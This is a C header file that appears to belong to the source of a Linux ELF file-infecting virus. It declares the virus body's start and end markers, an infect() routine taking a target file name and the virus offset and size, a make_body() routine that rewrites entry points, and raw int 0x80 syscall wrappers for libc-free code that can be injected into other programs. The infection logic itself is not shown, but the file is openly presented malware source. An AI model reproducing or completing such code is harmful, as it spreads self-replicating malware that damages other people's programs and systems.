/*
 *	By using this file, you agree to the terms and conditions set
 *	forth in the COPYING file which can be found at the top level
 *	of this distribution.
 */
#define	uint			unsigned int
#define uchar			unsigned char
#define NULL			((void*)0)
#define	PAGE_SIZE		4096
#define DIRENT_DNAME		10
#define DIRENT_SIZE		268
#define SECTION(S)		__attribute__((__section__(#S)))

/* bits/mman.h */
/* Protections are chosen from these bits, OR'd together.  The
   implementation does not necessarily support PROT_EXEC or PROT_WRITE
   without PROT_READ.  The only guarantees are that no writing will be
   allowed without PROT_WRITE and no access will be allowed for PROT_NONE. */

#define PROT_READ	0x1		/* Page can be read.  */
#define PROT_WRITE	0x2		/* Page can be written.  */
#define PROT_EXEC	0x4		/* Page can be executed.  */
#define PROT_NONE	0x0		/* Page can not be accessed.  */

/* Sharing types (must choose one and only one of these).  */
#define MAP_SHARED	0x01		/* Share changes.  */
#define MAP_PRIVATE	0x02		/* Changes are private.  */

/* virus.c */
extern void start(void);
extern void end(void);

/* mcmd.c */
extern int	make_body(uint oentry, uint nentry, uint vstart, uint vsize, uchar *buf);

/* infect.c */
extern int	infect(char *name, uint vir_start, uint vir_size);

#ifdef	USE_RDTSC
#define	INIT_SEED(s)				\
	asm volatile ("	push	%%edx\n		\
			rdtsc\n			\
			pop	%%edx": "=a"(s));
#else
#define	INIT_SEED(s)	s= time(NULL);
#endif

/* Syscalls */
#define ASM	asm volatile
#define	_SC(r,NR)	"push %1\npop %%eax\nint $0x80":"=a"(r):"i"(NR)
#define syscall0(NR)				\
({int r;ASM(_SC(r,NR));r; })
#define syscall1(NR,a)				\
({int r;ASM(_SC(r,NR),"b"((int)(a)));r;})
#define syscall2(NR,a,b)			\
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)));r;})
#define syscall3(NR,a,b,c)			\
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)));r;})
#define syscall6(NR,a,b,c,d,e,f)		\
({int r;ASM("push %%ebp\nmovl %%eax,%%ebp\nmov %1,%%eax\nint $0x80\npop %%ebp"\
	:"=a"(r):"i"(NR),"b"((int)(a)),		\
	"c"((int)(b)),"d"((int)(c)),"S"((int)(d)),"D"((int)(e)),"0"((int)(f)));r;})

#define exit(a)			syscall1(1,  a)
#define read(a,b,c)		syscall3(3,  a,b,c)
#define	write(a,b,c)		syscall3(4,  a,b,c)
#define open(a,b)		syscall2(5,  a,b)
#define	close(a)		syscall1(6,  a)
#define	creat(a,b)		syscall2(8,  a,b)
#define time(a)			syscall1(13, a)
#define lseek(a,b,c)		syscall3(19, a,b,c)
#define	rename(a,b)		syscall2(38, a,b)
#define readdir(a,b)		syscall2(89, a,b)
#define munmap(a,b)		syscall2(91, a,b)
#define	mprotect(a,b,c)		syscall3(125,a,b,c)
#define mmap(a,b,c,d,e,f)	syscall6(192,a,b,c,d,e,f)
